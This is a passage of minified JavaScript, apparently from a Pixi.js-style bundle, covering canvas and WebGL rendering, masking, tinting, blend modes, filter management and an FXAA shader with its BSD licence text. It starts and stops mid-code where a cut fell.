T=s.x,E=s.y,S=s.width,A=s.height,w=s.radius,C=Math.min(S,A)/2|0;w=w>C?C:w,e.beginPath(),e.moveTo(T,E+w),e.lineTo(T,E+A-w),e.quadraticCurveTo(T,E+A,T+w,E+A),e.lineTo(T+S-w,E+A),e.quadraticCurveTo(T+S,E+A,T+S,E+A-w),e.lineTo(T+S,E+w),e.quadraticCurveTo(T+S,E,T+S-w,E),e.lineTo(T+w,E),e.quadraticCurveTo(T,E,T,E+w),e.closePath(),(o.fillColor||0===o.fillColor)&&(e.globalAlpha=o.fillAlpha*r,e.fillStyle="#"+("00000"+(0|a).toString(16)).substr(-6),e.fill()),o.lineWidth&&(e.globalAlpha=o.lineAlpha*r,e.strokeStyle="#"+("00000"+(0|h).toString(16)).substr(-6),e.stroke())}}},n.renderGraphicsMask=function(t,e){var r=t.graphicsData.length;if(0!==r){e.beginPath();for(var n=0;r>n;n++){var o=t.graphicsData[n],s=o.shape;if(o.type===i.SHAPES.POLY){var a=s.points;e.moveTo(a[0],a[1]);for(var h=1;h<a.length/2;h++)e.lineTo(a[2*h],a[2*h+1]);a[0]===a[a.length-2]&&a[1]===a[a.length-1]&&e.closePath()}else if(o.type===i.SHAPES.RECT)e.rect(s.x,s.y,s.width,s.height),e.closePath();else if(o.type===i.SHAPES.CIRC)e.arc(s.x,s.y,s.radius,0,2*Math.PI),e.closePath();else if(o.type===i.SHAPES.ELIP){var l=2*s.width,u=2*s.height,c=s.x-l/2,p=s.y-u/2,d=.5522848,f=l/2*d,v=u/2*d,g=c+l,m=p+u,y=c+l/2,x=p+u/2;e.moveTo(c,x),e.bezierCurveTo(c,x-v,y-f,p,y,p),e.bezierCurveTo(y+f,p,g,x-v,g,x),e.bezierCurveTo(g,x+v,y+f,m,y,m),e.bezierCurveTo(y-f,m,c,x+v,c,x),e.closePath()}else if(o.type===i.SHAPES.RREC){var b=s.x,_=s.y,T=s.width,E=s.height,S=s.radius,A=Math.min(T,E)/2|0;S=S>A?A:S,e.moveTo(b,_+S),e.lineTo(b,_+E-S),e.quadraticCurveTo(b,_+E,b+S,_+E),e.lineTo(b+T-S,_+E),e.quadraticCurveTo(b+T,_+E,b+T,_+E-S),e.lineTo(b+T,_+S),e.quadraticCurveTo(b+T,_,b+T-S,_),e.lineTo(b+S,_),e.quadraticCurveTo(b,_,b,_+S),e.closePath()}}}},n.updateGraphicsTint=function(t){if(16777215!==t.tint)for(var e=(t.tint>>16&255)/255,r=(t.tint>>8&255)/255,i=(255&t.tint)/255,n=0;n<t.graphicsData.length;n++){var o=t.graphicsData[n],s=0|o.fillColor,a=0|o.lineColor;o._fillTint=((s>>16&255)/255*e*255<<16)+((s>>8&255)/255*r*255<<8)+(255&s)/255*i*255,o._lineTint=((a>>16&255)/255*e*255<<16)+((a>>8&255)/255*r*255<<8)+(255&a)/255*i*255}}},{"../../../const":22}],46:[function(t,e,r){function i(){}var n=t("./CanvasGraphics");i.prototype.constructor=i,e.exports=i,i.prototype.pushMask=function(t,e){e.context.save();var r=t.alpha,i=t.worldTransform,o=e.resolution;e.context.setTransform(i.a*o,i.b*o,i.c*o,i.d*o,i.tx*o,i.ty*o),t.texture||(n.renderGraphicsMask(t,e.context),e.context.clip()),t.worldAlpha=r},i.prototype.popMask=function(t){t.context.restore()},i.prototype.destroy=function(){}},{"./CanvasGraphics":45}],47:[function(t,e,r){var i=t("../../../utils"),n={};e.exports=n,n.getTintedTexture=function(t,e){var r=t.texture;e=n.roundColor(e);var i="#"+("00000"+(0|e).toString(16)).substr(-6);if(r.tintCache=r.tintCache||{},r.tintCache[i])return r.tintCache[i];var o=n.canvas||document.createElement("canvas");if(n.tintMethod(r,e,o),n.convertTintToImage){var s=new Image;s.src=o.toDataURL(),r.tintCache[i]=s}else r.tintCache[i]=o,n.canvas=null;return o},n.tintWithMultiply=function(t,e,r){var i=r.getContext("2d"),n=t.crop;r.width=n.width,r.height=n.height,i.fillStyle="#"+("00000"+(0|e).toString(16)).substr(-6),i.fillRect(0,0,n.width,n.height),i.globalCompositeOperation="multiply",i.drawImage(t.baseTexture.source,n.x,n.y,n.width,n.height,0,0,n.width,n.height),i.globalCompositeOperation="destination-atop",i.drawImage(t.baseTexture.source,n.x,n.y,n.width,n.height,0,0,n.width,n.height)},n.tintWithOverlay=function(t,e,r){var i=r.getContext("2d"),n=t.crop;r.width=n.width,r.height=n.height,i.globalCompositeOperation="copy",i.fillStyle="#"+("00000"+(0|e).toString(16)).substr(-6),i.fillRect(0,0,n.width,n.height),i.globalCompositeOperation="destination-atop",i.drawImage(t.baseTexture.source,n.x,n.y,n.width,n.height,0,0,n.width,n.height)},n.tintWithPerPixel=function(t,e,r){var n=r.getContext("2d"),o=t.crop;r.width=o.width,r.height=o.height,n.globalCompositeOperation="copy",n.drawImage(t.baseTexture.source,o.x,o.y,o.width,o.height,0,0,o.width,o.height);for(var s=i.hex2rgb(e),a=s[0],h=s[1],l=s[2],u=n.getImageData(0,0,o.width,o.height),c=u.data,p=0;p<c.length;p+=4)c[p+0]*=a,c[p+1]*=h,c[p+2]*=l;n.putImageData(u,0,0)},n.roundColor=function(t){var e=n.cacheStepsPerColorChannel,r=i.hex2rgb(t);return r[0]=Math.min(255,r[0]/e*e),r[1]=Math.min(255,r[1]/e*e),r[2]=Math.min(255,r[2]/e*e),i.rgb2hex(r)},n.cacheStepsPerColorChannel=8,n.convertTintToImage=!1,n.canUseMultiply=i.canUseNewCanvasBlendModes(),n.tintMethod=n.canUseMultiply?n.tintWithMultiply:n.tintWithPerPixel},{"../../../utils":76}],48:[function(t,e,r){function i(t,e,r){r=r||{},n.call(this,"WebGL",t,e,r),this.type=f.RENDERER_TYPE.WEBGL,this.handleContextLost=this.handleContextLost.bind(this),this.handleContextRestored=this.handleContextRestored.bind(this),this.view.addEventListener("webglcontextlost",this.handleContextLost,!1),this.view.addEventListener("webglcontextrestored",this.handleContextRestored,!1),this._useFXAA=!!r.forceFXAA&&r.antialias,this._FXAAFilter=null,this._contextOptions={alpha:this.transparent,antialias:r.antialias,premultipliedAlpha:this.transparent&&"notMultiplied"!==this.transparent,stencil:!0,preserveDrawingBuffer:r.preserveDrawingBuffer},this.drawCount=0,this.shaderManager=new o(this),this.maskManager=new s(this),this.stencilManager=new a(this),this.filterManager=new h(this),this.blendModeManager=new l(this),this.currentRenderTarget=null,this.currentRenderer=new c(this),this.initPlugins(),this._createContext(),this._initContext(),this._mapGlModes(),this._renderTargetStack=[]}var n=t("../SystemRenderer"),o=t("./managers/ShaderManager"),s=t("./managers/MaskManager"),a=t("./managers/StencilManager"),h=t("./managers/FilterManager"),l=t("./managers/BlendModeManager"),u=t("./utils/RenderTarget"),c=t("./utils/ObjectRenderer"),p=t("./filters/FXAAFilter"),d=t("../../utils"),f=t("../../const");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,d.pluginTarget.mixin(i),i.glContextId=0,i.prototype._createContext=function(){var t=this.view.getContext("webgl",this._contextOptions)||this.view.getContext("experimental-webgl",this._contextOptions);if(this.gl=t,!t)throw new Error("This browser does not support webGL. Try using the canvas renderer");this.glContextId=i.glContextId++,t.id=this.glContextId,t.renderer=this},i.prototype._initContext=function(){var t=this.gl;t.disable(t.DEPTH_TEST),t.disable(t.CULL_FACE),t.enable(t.BLEND),this.renderTarget=new u(t,this.width,this.height,null,this.resolution,!0),this.setRenderTarget(this.renderTarget),this.emit("context",t),this.resize(this.width,this.height),this._useFXAA||(this._useFXAA=this._contextOptions.antialias&&!t.getContextAttributes().antialias),this._useFXAA&&(window.console.warn("FXAA antialiasing being used instead of native antialiasing"),this._FXAAFilter=[new p])},i.prototype.render=function(t){if(!this.gl.isContextLost()){this.drawCount=0,this._lastObjectRendered=t,this._useFXAA&&(this._FXAAFilter[0].uniforms.resolution.value.x=this.width,this._FXAAFilter[0].uniforms.resolution.value.y=this.height,t.filterArea=this.renderTarget.size,t.filters=this._FXAAFilter);var e=t.parent;t.parent=this._tempDisplayObjectParent,t.updateTransform(),t.parent=e;var r=this.gl;this.setRenderTarget(this.renderTarget),this.clearBeforeRender&&(this.transparent?r.clearColor(0,0,0,0):r.clearColor(this._backgroundColorRgb[0],this._backgroundColorRgb[1],this._backgroundColorRgb[2],1),r.clear(r.COLOR_BUFFER_BIT)),this.renderDisplayObject(t,this.renderTarget)}},i.prototype.renderDisplayObject=function(t,e,r){this.setRenderTarget(e),r&&e.clear(),this.filterManager.setFilterStack(e.filterStack),t.renderWebGL(this),this.currentRenderer.flush()},i.prototype.setObjectRenderer=function(t){this.currentRenderer!==t&&(this.currentRenderer.stop(),this.currentRenderer=t,this.currentRenderer.start())},i.prototype.setRenderTarget=function(t){this.currentRenderTarget!==t&&(this.currentRenderTarget=t,this.currentRenderTarget.activate(),this.stencilManager.setMaskStack(t.stencilMaskStack))},i.prototype.resize=function(t,e){n.prototype.resize.call(this,t,e),this.filterManager.resize(t,e),this.renderTarget.resize(t,e),this.currentRenderTarget===this.renderTarget&&(this.renderTarget.activate(),this.gl.viewport(0,0,this.width,this.height))},i.prototype.updateTexture=function(t){if(t=t.baseTexture||t,t.hasLoaded){var e=this.gl;return t._glTextures[e.id]||(t._glTextures[e.id]=e.createTexture(),t.on("update",this.updateTexture,this),t.on("dispose",this.destroyTexture,this)),e.bindTexture(e.TEXTURE_2D,t._glTextures[e.id]),e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,t.premultipliedAlpha),e.texImage2D(e.TEXTURE_2D,0,e.RGBA,e.RGBA,e.UNSIGNED_BYTE,t.source),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,t.scaleMode===f.SCALE_MODES.LINEAR?e.LINEAR:e.NEAREST),t.mipmap&&t.isPowerOfTwo?(e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,t.scaleMode===f.SCALE_MODES.LINEAR?e.LINEAR_MIPMAP_LINEAR:e.NEAREST_MIPMAP_NEAREST),e.generateMipmap(e.TEXTURE_2D)):e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,t.scaleMode===f.SCALE_MODES.LINEAR?e.LINEAR:e.NEAREST),t.isPowerOfTwo?(e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,e.REPEAT),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,e.REPEAT)):(e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,e.CLAMP_TO_EDGE),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,e.CLAMP_TO_EDGE)),t._glTextures[e.id]}},i.prototype.destroyTexture=function(t){t=t.baseTexture||t,t.hasLoaded&&t._glTextures[this.gl.id]&&this.gl.deleteTexture(t._glTextures[this.gl.id])},i.prototype.handleContextLost=function(t){t.preventDefault()},i.prototype.handleContextRestored=function(){this._initContext();for(var t in d.BaseTextureCache)d.BaseTextureCache[t]._glTextures.length=0},i.prototype.destroy=function(t){this.destroyPlugins(),this.view.removeEventListener("webglcontextlost",this.handleContextLost),this.view.removeEventListener("webglcontextrestored",this.handleContextRestored),n.prototype.destroy.call(this,t),this.uid=0,this.shaderManager.destroy(),this.maskManager.destroy(),this.stencilManager.destroy(),this.filterManager.destroy(),this.shaderManager=null,this.maskManager=null,this.filterManager=null,this.blendModeManager=null,this.handleContextLost=null,this.handleContextRestored=null,this._contextOptions=null,this.drawCount=0,this.gl=null},i.prototype._mapGlModes=function(){var t=this.gl;this.blendModes||(this.blendModes={},this.blendModes[f.BLEND_MODES.NORMAL]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.ADD]=[t.SRC_ALPHA,t.DST_ALPHA],this.blendModes[f.BLEND_MODES.MULTIPLY]=[t.DST_COLOR,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.SCREEN]=[t.SRC_ALPHA,t.ONE],this.blendModes[f.BLEND_MODES.OVERLAY]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.DARKEN]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.LIGHTEN]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.COLOR_DODGE]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.COLOR_BURN]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.HARD_LIGHT]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.SOFT_LIGHT]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.DIFFERENCE]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.EXCLUSION]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.HUE]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.SATURATION]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.COLOR]=[t.ONE,t.ONE_MINUS_SRC_ALPHA],this.blendModes[f.BLEND_MODES.LUMINOSITY]=[t.ONE,t.ONE_MINUS_SRC_ALPHA]),this.drawModes||(this.drawModes={},this.drawModes[f.DRAW_MODES.POINTS]=t.POINTS,this.drawModes[f.DRAW_MODES.LINES]=t.LINES,this.drawModes[f.DRAW_MODES.LINE_LOOP]=t.LINE_LOOP,this.drawModes[f.DRAW_MODES.LINE_STRIP]=t.LINE_STRIP,this.drawModes[f.DRAW_MODES.TRIANGLES]=t.TRIANGLES,this.drawModes[f.DRAW_MODES.TRIANGLE_STRIP]=t.TRIANGLE_STRIP,this.drawModes[f.DRAW_MODES.TRIANGLE_FAN]=t.TRIANGLE_FAN)}},{"../../const":22,"../../utils":76,"../SystemRenderer":42,"./filters/FXAAFilter":50,"./managers/BlendModeManager":52,"./managers/FilterManager":53,"./managers/MaskManager":54,"./managers/ShaderManager":55,"./managers/StencilManager":56,"./utils/ObjectRenderer":62,"./utils/RenderTarget":64}],49:[function(t,e,r){function i(t,e,r){this.shaders=[],this.padding=0,this.uniforms=r||{},this.vertexSrc=t||n.defaultVertexSrc,this.fragmentSrc=e||n.defaultFragmentSrc}var n=t("../shaders/TextureShader");i.prototype.constructor=i,e.exports=i,i.prototype.getShader=function(t){var e=t.gl,r=this.shaders[e.id];return r||(r=new n(t.shaderManager,this.vertexSrc,this.fragmentSrc,this.uniforms,this.attributes),this.shaders[e.id]=r),r},i.prototype.applyFilter=function(t,e,r,i){var n=this.getShader(t);t.filterManager.applyFilter(n,e,r,i)},i.prototype.syncUniform=function(t){for(var e=0,r=this.shaders.length;r>e;++e)this.shaders[e].syncUniform(t)}},{"../shaders/TextureShader":61}],50:[function(t,e,r){function i(){n.call(this,"\nprecision mediump float;\n\nattribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform mat3 projectionMatrix;\nuniform vec2 resolution;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nvarying vec2 vResolution;\n\n//texcoords computed in vertex step\n//to avoid dependent texture reads\nvarying vec2 v_rgbNW;\nvarying vec2 v_rgbNE;\nvarying vec2 v_rgbSW;\nvarying vec2 v_rgbSE;\nvarying vec2 v_rgbM;\n\n\nvoid texcoords(vec2 fragCoord, vec2 resolution,\n            out vec2 v_rgbNW, out vec2 v_rgbNE,\n            out vec2 v_rgbSW, out vec2 v_rgbSE,\n            out vec2 v_rgbM) {\n    vec2 inverseVP = 1.0 / resolution.xy;\n    v_rgbNW = (fragCoord + vec2(-1.0, -1.0)) * inverseVP;\n    v_rgbNE = (fragCoord + vec2(1.0, -1.0)) * inverseVP;\n    v_rgbSW = (fragCoord + vec2(-1.0, 1.0)) * inverseVP;\n    v_rgbSE = (fragCoord + vec2(1.0, 1.0)) * inverseVP;\n    v_rgbM = vec2(fragCoord * inverseVP);\n}\n\nvoid main(void){\n   gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n   vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n   vResolution = resolution;\n\n   //compute the texture coords and send them to varyings\n   texcoords(aTextureCoord * resolution, resolution, v_rgbNW, v_rgbNE, v_rgbSW, v_rgbSE, v_rgbM);\n}\n",'precision lowp float;\n\n\n/**\nBasic FXAA implementation based on the code on geeks3d.com with the\nmodification that the texture2DLod stuff was removed since it\'s\nunsupported by WebGL.\n\n--\n\nFrom:\nhttps://github.com/mitsuhiko/webgl-meincraft\n\nCopyright (c) 2011 by Armin Ronacher.\n\nSome rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n\n    * Redistributions in binary form must reproduce the above\n      copyright notice, this list of conditions and the following\n      disclaimer in the documentation and/or other materials provided\n      with the distribution.\n\n    * The names of the contributors may not be used to endorse or\n      promote products derived from this software without specific\n      prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#ifndef FXAA_REDUCE_MIN\n    #define FXAA_REDUCE_MIN   (1.0/ 128.0)\n#endif\n#ifndef FXAA_REDUCE_MUL\n    #define FXAA_REDUCE_MUL   (1.0 / 8.0)\n#endif\n#ifndef FXAA_SPAN_MAX\n    #define FXAA_SPAN_MAX     8.0\n#endif\n\n//optimized version for mobile, where dependent\n//texture reads can be a bottleneck\nvec4 fxaa(sampler2D tex, vec2 fragCoord, vec2 resolution,\n            vec2 v_rgbNW, vec2 v_rgbNE,\n            vec2 v_rgbSW, vec2 v_rgbSE,\n            vec2 v_rgbM) {\n    vec4 color;\n    mediump vec2 inverseVP = vec2(1.0 / resolution.x, 1.0 / resolution.y);\n    vec3 rgbNW = texture2D(tex, v_rgbNW).xyz;\n    vec3 rgbNE = texture2D(tex, v_rgbNE).xyz;\n    vec3 rgbSW = texture2D(tex, v_rgbSW).xyz;\n    vec3 rgbSE = texture2D(tex, v_rgbSE).xyz;\n    vec4 texColor = texture2D(tex, v_rgbM);\n    vec3 rgbM  = texColor.xyz;\n    vec3 luma = vec3(0.299, 0.587, 0.114);\n    float lumaNW = dot(rgbNW, luma);\n    float lumaNE = dot(rgbNE, luma);\n    float lumaSW = dot(rgbSW, luma);\n    float lumaSE = dot(rgbSE, luma);\n    float lumaM  = dot(rgbM,  luma);\n    float lumaMin = min(lumaM, min(min(lumaNW, lumaNE), min(lumaSW, lumaSE)));\n    float lumaMax = max(lumaM, max(max(lumaNW, lumaNE), max(lumaSW, lumaSE)));\n\n    mediump vec2 dir;\n    dir.x = -((lumaNW + lumaNE) - (lumaSW + lumaSE));\n    dir.y =  ((lumaNW + lumaSW) - (lumaNE + lumaSE));\n\n    float dirReduce = max((lumaNW + lumaNE + lumaSW + lumaSE) *\n                          (0.25 * FXAA_REDUCE_MUL), FXAA_REDUCE_MIN);\n\n    float rcpDirMin = 1.0 / (min(abs(dir.x), abs(dir.y)) + dirReduce);\n    dir = min(vec2(FXAA_SPAN_MAX, FXAA_SPAN_MAX),\n              max(vec2(-FXAA_SPAN_MAX, -FXAA_SPAN_MAX),\n              dir * rcpDirMin)) * inverseVP;\n\n    vec3 rgbA = 0.5 * (\n        texture2D(tex, fragCoord * inverseVP + dir * (1.0 / 3.0 - 0.5)).xyz +\n        texture2D(tex, fragCoord * inverseVP + dir * (2.0 / 3.0 - 0.5)).xyz);\n    vec3 rgbB = rgbA * 0.5 + 0.25 * (\n        texture2D(tex, fragCoord * inverseVP + dir * -0.5).xyz +\n        texture2D(tex, fragCoord * inverseVP + dir * 0.5).xyz);\n\n    float lumaB = dot(rgbB, luma);\n    if ((lumaB < lumaMin) || (lumaB > lumaMax))\n        color = vec4(rgbA, texColor.a);\n    else\n        color = vec4(rgbB, texColor.a);\n    return color;\n}\n\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying vec2 vResolution;\n\n//texcoords computed in vertex step\n//to avoid dependent texture reads\nvarying vec2 v_rgbNW;\nvarying vec2 v_rgbNE;\nvarying vec2 v_rgbSW;\nvarying vec2 v_rgbSE;\nvarying vec2 v_rgbM;\n\nuniform sampler2D uSampler;\n\n\nvoid main(void){\n\n    gl_FragColor = fxaa(uSampler, vTextureCoord * vResolution, vResolution, v_rgbNW, v_rgbNE, v_rgbSW, v_rgbSE, v_rgbM);\n\n}\n',{
resolution:{type:"v2",value:{x:1,y:1}}})}var n=t("./AbstractFilter");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager,n=this.getShader(t);i.applyFilter(n,e,r)}},{"./AbstractFilter":49}],51:[function(t,e,r){function i(t){var e=new o.Matrix;n.call(this,"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform mat3 projectionMatrix;\nuniform mat3 otherMatrix;\n\nvarying vec2 vMaskCoord;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nvoid main(void)\n{\n    gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);\n    vTextureCoord = aTextureCoord;\n    vMaskCoord = ( otherMatrix * vec3( aTextureCoord, 1.0)  ).xy;\n    vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n}\n","precision lowp float;\n\nvarying vec2 vMaskCoord;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nuniform sampler2D uSampler;\nuniform float alpha;\nuniform sampler2D mask;\n\nvoid main(void)\n{\n    // check clip! this will stop the mask bleeding out from the edges\n    vec2 text = abs( vMaskCoord - 0.5 );\n    text = step(0.5, text);\n    float clip = 1.0 - max(text.y, text.x);\n    vec4 original = texture2D(uSampler, vTextureCoord);\n    vec4 masky = texture2D(mask, vMaskCoord);\n    original *= (masky.r * masky.a * alpha * clip);\n    gl_FragColor = original;\n}\n",{mask:{type:"sampler2D",value:t._texture},alpha:{type:"f",value:1},otherMatrix:{type:"mat3",value:e.toArray(!0)}}),this.maskSprite=t,this.maskMatrix=e}var n=t("./AbstractFilter"),o=t("../../../math");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager;this.uniforms.mask.value=this.maskSprite._texture,i.calculateMappedMatrix(e.frame,this.maskSprite,this.maskMatrix),this.uniforms.otherMatrix.value=this.maskMatrix.toArray(!0),this.uniforms.alpha.value=this.maskSprite.worldAlpha;var n=this.getShader(t);i.applyFilter(n,e,r)},Object.defineProperties(i.prototype,{map:{get:function(){return this.uniforms.mask.value},set:function(t){this.uniforms.mask.value=t}},offset:{get:function(){return this.uniforms.offset.value},set:function(t){this.uniforms.offset.value=t}}})},{"../../../math":32,"./AbstractFilter":49}],52:[function(t,e,r){function i(t){n.call(this,t),this.currentBlendMode=99999}var n=t("./WebGLManager");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.setBlendMode=function(t){if(this.currentBlendMode===t)return!1;this.currentBlendMode=t;var e=this.renderer.blendModes[this.currentBlendMode];return this.renderer.gl.blendFunc(e[0],e[1]),!0}},{"./WebGLManager":57}],53:[function(t,e,r){function i(t){n.call(this,t),this.filterStack=[],this.filterStack.push({renderTarget:t.currentRenderTarget,filter:[],bounds:null}),this.texturePool=[],this.textureSize=new h.Rectangle(0,0,t.width,t.height),this.currentFrame=null}var n=t("./WebGLManager"),o=t("../utils/RenderTarget"),s=t("../../../const"),a=t("../utils/Quad"),h=t("../../../math");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.onContextChange=function(){this.texturePool.length=0;var t=this.renderer.gl;this.quad=new a(t)},i.prototype.setFilterStack=function(t){this.filterStack=t},i.prototype.pushFilter=function(t,e){var r=t.filterArea?t.filterArea.clone():t.getBounds();r.x=0|r.x,r.y=0|r.y,r.width=0|r.width,r.height=0|r.height;var i=0|e[0].padding;if(r.x-=i,r.y-=i,r.width+=2*i,r.height+=2*i,this.renderer.currentRenderTarget.transform){var n=this.renderer.currentRenderTarget.transform;r.x+=n.tx,r.y+=n.ty,this.capFilterArea(r),r.x-=n.tx,r.y-=n.ty}else this.capFilterArea(r);if(r.width>0&&r.height>0){this.currentFrame=r;var o=this.getRenderTarget();this.renderer.setRenderTarget(o),o.clear(),this.filterStack.push({renderTarget:o,filter:e})}else this.filterStack.push({renderTarget:null,filter:e})},i.prototype.popFilter=function(){var t=this.filterStack.pop(),e=this.filterStack[this.filterStack.length-1],r=t.renderTarget;if(t.renderTarget){var i=e.renderTarget,n=this.renderer.gl;this.currentFrame=r.frame,this.quad.map(this.textureSize,r.frame),n.bindBuffer(n.ARRAY_BUFFER,this.quad.vertexBuffer),n.bindBuffer(n.ELEMENT_ARRAY_BUFFER,this.quad.indexBuffer);var o=t.filter;if(n.vertexAttribPointer(this.renderer.shaderManager.defaultShader.attributes.aVertexPosition,2,n.FLOAT,!1,0,0),n.vertexAttribPointer(this.renderer.shaderManager.defaultShader.attributes.aTextureCoord,2,n.FLOAT,!1,0,32),n.vertexAttribPointer(this.renderer.shaderManager.defaultShader.attributes.aColor,4,n.FLOAT,!1,0,64),this.renderer.blendModeManager.setBlendMode(s.BLEND_MODES.NORMAL),1===o.length)o[0].uniforms.dimensions&&(o[0].uniforms.dimensions.value[0]=this.renderer.width,o[0].uniforms.dimensions.value[1]=this.renderer.height,o[0].uniforms.dimensions.value[2]=this.quad.vertices[0],o[0].uniforms.dimensions.value[3]=this.quad.vertices[5]),o[0].applyFilter(this.renderer,r,i),this.returnRenderTarget(r);else{for(var a=r,h=this.getRenderTarget(!0),l=0;l<o.length-1;l++){var u=o[l];u.uniforms.dimensions&&(u.uniforms.dimensions.value[0]=this.renderer.width,u.uniforms.dimensions.value[1]=this.renderer.height,u.uniforms.dimensions.value[2]=this.quad.vertices[0],u.uniforms.dimensions.value[3]=this.quad.vertices[5]),u.applyFilter(this.renderer,a,h);var c=a;a=h,h=c}o[o.length-1].applyFilter(this.renderer,a,i),this.returnRenderTarget(a),this.returnRenderTarget(h)}return t.filter}},i.prototype.getRenderTarget=function(t){var e=this.texturePool.pop()||new o(this.renderer.gl,this.textureSize.width,this.textureSize.height,s.SCALE_MODES.LINEAR,this.renderer.resolution*s.FILTER_RESOLUTION);return e.frame=this.currentFrame,t&&e.clear(!0),e},i.prototype.returnRenderTarget=function(t){this.texturePool.push(t)},i.prototype.applyFilter=function(t,e,r,i){var n=this.renderer.gl;this.renderer.setRenderTarget(r),i&&r.clear(),this.renderer.shaderManager.setShader(t),t.uniforms.projectionMatrix.value=this.renderer.currentRenderTarget.projectionMatrix.toArray(!0),t.syncUniforms(),n.activeTexture(n.TEXTURE0),n.bindTexture(n.TEXTURE_2D,e.texture),n.drawElements(n.TRIANGLES,6,n.UNSIGNED_SHORT,0)},i.prototype.calculateMappedMatrix=function(t,e,r){var i=e.worldTransform.copy(h.Matrix.TEMP_MATRIX),n=e._texture.baseTexture,o=r.identity(),s=this.textureSize.height/this.textureSize.width;o.translate(t.x/this.textureSize.width,t.y/this.textureSize.height),o.scale(1,s);var a=this.textureSize.width/n.width,l=this.textureSize.height/n.height;return i.tx/=n.width*a,i.ty/=n.width*a,i.invert(),o.prepend(i),o.scale(1,1/s),o.scale(a,l),o.translate(e.anchor.x,e.anchor.y),o},i.prototype.capFilterArea=function(t){t.x<0&&(t.width+=t.x,t.x=0),t.y<0&&(t.height+=t.y,t.y=0),t.x+t.width>this.textureSize.width&&(t.width=this.textureSize.width-t.x),t.y+t.height>this.textureSize.height&&(t.height=this.textureSize.height-t.y)},i.prototype.resize=function(t,e){this.textureSize.width=t,this.textureSize.height=e;for(var r=0;r<this.texturePool.length;r++)this.texturePool[r].resize(t,e)},i.prototype.destroy=function(){this.filterStack=null,this.offsetY=0;for(var t=0;t<this.texturePool.length;t++)this.texturePool[t].destroy();this.texturePool=null}},{"../../../const":22,"../../../math":32,"../utils/Quad":63,"../utils/RenderTarget":64,"./WebGLManager":57}],54:[function(t,e,r){function i(t){n.call(this,t),this.stencilStack=[],this.reverse=!0,this.count=0,this.alphaMaskPool=[]}var 